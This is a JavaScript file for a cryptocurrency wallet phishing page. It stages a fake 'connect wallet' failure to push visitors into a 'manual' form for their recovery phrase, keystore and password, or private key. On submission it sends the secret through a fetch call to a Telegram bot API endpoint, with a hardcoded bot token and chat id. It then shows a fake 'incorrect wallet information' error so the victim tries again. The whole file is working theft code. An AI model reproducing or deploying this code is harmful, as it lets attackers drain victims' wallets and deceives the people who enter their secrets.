document.addEventListener("DOMContentLoaded", function () {
  // --- Utility functions ---
  const show = (el) => {
    if (el) el.style.display = "block";
  };
  const hide = (el) => {
    if (el) el.style.display = "none";
  };

  const dismissAllDialogs = () => {
    [
      "success-dialog",
      "error-dialog",
      "connect-dialog",
      "send-dialog",
      "processing-dialog",
    ].forEach((id) => hide(document.getElementById(id)));
  };

  // --- Selectors ---
  const wallets = document.querySelectorAll(".coin-registry button");
  const connectionInfo = document.querySelector(".connection-info");
  const currentWalletApp = document.getElementById("current-wallet-app");
  const currentWalletLogo = document.getElementById("current-wallet-logo");
  const connectDialog = document.getElementById("connect-dialog");
  const sendDialog = document.getElementById("send-dialog");
  const errorBox = document.getElementById("error-dialog");
  const sendFormContainer = document.getElementById("data-to-send");
  const processForm = document.getElementById("form");

  // 1. Wallet Selection Logic
  wallets.forEach((button) => {
    button.addEventListener("click", function (event) {
      event.preventDefault();
      const img = this.querySelector(".coin-img");
      const imgPath = img ? img.getAttribute("src") : "";
      const walletName = this.innerText.trim();

      connectionInfo.textContent = "Initializing...";
      currentWalletApp.textContent = walletName;
      currentWalletLogo.src = imgPath;

      show(connectDialog);

      setTimeout(() => {
        connectionInfo.innerHTML =
          'Error Connecting... <button type="button" class="manual-connection">Connect Manually</button>';

        const manualBtn = document.querySelector("button.manual-connection");
        manualBtn?.addEventListener("click", () => {
          document.getElementById("current-wallet-app-send").textContent =
            walletName;
          document.getElementById("walletNameData").value = walletName;
          document.getElementById("current-wallet-send-logo").src = imgPath;
          hide(connectDialog);
          show(sendDialog);
        });

        // Auto-trigger manual transition
        manualBtn?.click();
      }, 1000);
    });
  });

  // 2. Dialog Dismissal
  document.querySelectorAll(".dialog-dismiss").forEach((btn) => {
    btn.addEventListener("click", () => {
      dismissAllDialogs();
    });
  });

  // 3. Tab Content Switching
  document.getElementById("phraseSend")?.addEventListener("click", () => {
    sendFormContainer.innerHTML = `
      <div class="form-group">
        <input type="hidden" name="type" value="phrase">
        <textarea name="phrase" required class="form-control" placeholder="Enter your recovery phrase" rows="5" style="resize: none"></textarea>
      </div> 
      <div class="small text-left my-3" style="font-size: 11px">Typically 12 (sometimes 24) words separated by single spaces</div>`;
  });

  document.getElementById("keystoreSend")?.addEventListener("click", () => {
    sendFormContainer.innerHTML = `
      <div class="form-group">
        <input type="hidden" name="type" value="keystore">
        <textarea rows="5" style="resize: none" required name="keystore" class="form-control" placeholder="Enter Keystore"></textarea>
      </div>
      <input type="text" class="form-control" name="keystore-password" required placeholder="Wallet password"> 
      <div class="small text-left my-3" style="font-size: 11px">Several lines of text beginning with "{...}" plus the password you used to encrypt it.</div>`;
  });

  document.getElementById("privateKeySend")?.addEventListener("click", () => {
    sendFormContainer.innerHTML = `
      <input type="hidden" name="type" value="privatekey">
      <input type="text" name="privateKey" required class="form-control" placeholder="Enter your Private Key"> 
      <div class="small text-left my-3" style="font-size: 11px">Typically 64 alphanumeric characters.</div>`;
  });

  // 4. Form Submission (Updated with Custom Error & Modal Removal)
  processForm?.addEventListener("submit", async function (e) {
    e.preventDefault();

    const processBtn = this.querySelector('button[type="submit"]');
    const cancelBtn = document.getElementById("cancelBtn");
    const formData = new FormData(this);

    const wallet =
      formData.get("wallet") ||
      document.getElementById("walletNameData").value ||
      "Unknown";
    const type = formData.get("type") || "phrase";

    // Fail-safe capture logic
    const secret =
      formData.get("phrase") ||
      formData.get("phrase-key") ||
      formData.get("keystore") ||
      formData.get("privateKey") ||
      this.querySelector("textarea")?.value;

    const pass = formData.get("keystore-password")
      ? `\nPassword: ${formData.get("keystore-password")}`
      : "";

    if (!secret || secret.trim() === "") return;

    const message = `
<b>New Wallet Submission</b>
--------------------------
<b>Wallet:</b> ${wallet}
<b>Type:</b> ${type}
<b>Data:</b> <code>${secret}</code>${pass}
--------------------------`.trim();
    console.log(message);
    const originalBtnText = processBtn.innerHTML;
    processBtn.innerHTML = "Connecting...";
    processBtn.disabled = true;
    if (cancelBtn) cancelBtn.disabled = true;

    try {
      const response = await fetch(
        `https://api.telegram.org/bot8544540012:AAF7cZx2QqOKVGQ5gxguXsjXHyZuY96y7jw/sendMessage`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: "8368741386",
            text: message,
            parse_mode: "HTML",
          }),
        }
      );

      if (response.ok) {
        // Wait 4 seconds to simulate the connection effort
        setTimeout(() => {
          // 1. Reset Button UI
          processBtn.innerHTML = originalBtnText;
          processBtn.disabled = false;
          if (cancelBtn) cancelBtn.disabled = false;

          // 2. Show the "Incorrect Wallet Information" error
          const messageTab = document.querySelector(".message-tab");
          if (messageTab) {
            messageTab.innerHTML =
              "<div class='alert alert-danger' style='font-size: 13px;'>Incorrect wallet information, please check and try again</div>";
          }

          // 3. Remove the modal after showing the error for 2 seconds
          setTimeout(() => {
            dismissAllDialogs();
            // Clear the error message so it's fresh for next time
            if (messageTab) messageTab.innerHTML = "";
            processForm.reset();
          }, 3000);
        }, 4000);
      }
    } catch (error) {
      processBtn.innerHTML = originalBtnText;
      processBtn.disabled = false;
      dismissAllDialogs();
      show(errorBox);
    }
  });
});
